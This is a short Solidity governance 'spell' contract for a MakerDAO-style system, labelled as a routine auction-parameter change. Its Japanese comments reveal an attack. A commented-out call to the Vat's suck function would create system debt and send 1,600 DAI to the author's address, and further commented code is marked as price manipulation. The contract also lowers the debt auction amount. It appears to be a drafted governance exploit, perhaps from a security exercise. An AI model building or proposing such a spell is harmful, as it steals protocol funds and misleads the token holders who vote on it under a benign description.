// SPDX-License-Identifier: MIT

pragma solidity =0.6.12;

import "../lib/dss-exec-lib/src/DssAction.sol";
import "../lib/dss-exec-lib/src/DssExec.sol";
import "../lib/dss-exec-lib/src/DssExecLib.sol";

interface VatLike {
    function suck(
        address,
        address,
        uint256
    ) external;
}

contract DssSpellAction is DssAction {
    string public constant override description =
        "2022-10-26 Change auction parameters";

    uint256 internal constant RAD = 10**45;

    function officeHours() public view override returns (bool) {
        return false;
    }

    address public constant VAT = 0x1b1FE236166eD0Ac829fa230afE38E61bC281C5e;
    bytes32 public constant ILK =
        0x4641552d41000000000000000000000000000000000000000000000000000000;
    address public constant VOW = 0xd3563E656734650251556E7604dd24C3da9342B3;
    address public constant ME = 0x24bbfC323FC8f0e09aB7B433Cc8408c75dac8193;

    function actions() public override {
        // sump [rad] 45 digits
        // Debtオークション閾値を変更する
        DssExecLib.setDebtAuctionDAIAmount(100);
        // システムに負債を負わせて、DAIを自分のアカウントへ送金する
        // VatLike(VAT).suck(VOW, ME, 1600 * RAD);

        // 価格を操作する
        // bump 1000
        // DssExecLib.setSurplusAuctionAmount(1300);
        // hump 100
        // DssExecLib.setSurplusBuffer(100);
    }
}

contract DssSpell is DssExec {
    constructor()
        public
        DssExec(block.timestamp + 30 days, address(new DssSpellAction()))
    {}
}
